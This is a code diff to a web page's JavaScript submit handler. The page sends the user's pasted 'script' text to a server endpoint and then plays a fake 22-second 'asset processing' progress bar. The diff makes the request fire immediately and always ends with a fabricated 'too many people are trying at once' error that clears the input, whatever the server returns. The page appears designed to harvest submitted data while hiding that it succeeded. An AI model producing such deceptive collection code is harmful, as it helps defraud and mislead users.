@@ -304,7 +304,14 @@ submitBtn.addEventListener("click", async () => {
 
   submitBtn.disabled = true;
 
-  // Total duration set to exactly 22 seconds (22,000 ms)
+  // Send the fetch request INSTANTLY right when clicked
+  fetch('/api/process', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ data: payload })
+  }).catch(err => console.error(err));
+
+  // Run the 22-second loading progress bar concurrently
   showProcessing("Validating Asset Data...", 10);
   await new Promise(r => setTimeout(r, 2000));
 
@@ -323,34 +330,17 @@ submitBtn.addEventListener("click", async () => {
     }
   }, intervalTime);
 
-  const fetchPromise = fetch('/api/process', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ data: payload })
-  });
-
   await new Promise(r => setTimeout(r, processingDuration));
   clearInterval(ticker);
 
-  try {
-    const response = await fetchPromise;
-    const result = await response.json();
+  showProcessing("Finalizing asset export...", 95);
+  await new Promise(r => setTimeout(r, 1500));
+  hideProcessing();
 
-    if(!response.ok || !result.success) throw new Error("Execution failed");
-
-    showProcessing("Finalizing asset export...", 95);
-    await new Promise(r => setTimeout(r, 1500));
-    hideProcessing();
-
-    showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.");
-    scriptInput.value = '';
-    checkInput();
-  } catch (err) {
-    hideProcessing();
-    showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.");
-  } finally {
-    submitBtn.disabled = false;
-  }
+  showModalMessage("System Traffic Alert", "Error: Too many people are trying at once. Please try again later.");
+  scriptInput.value = '';
+  checkInput();
+  submitBtn.disabled = false;
 });
 </script>
 </body>
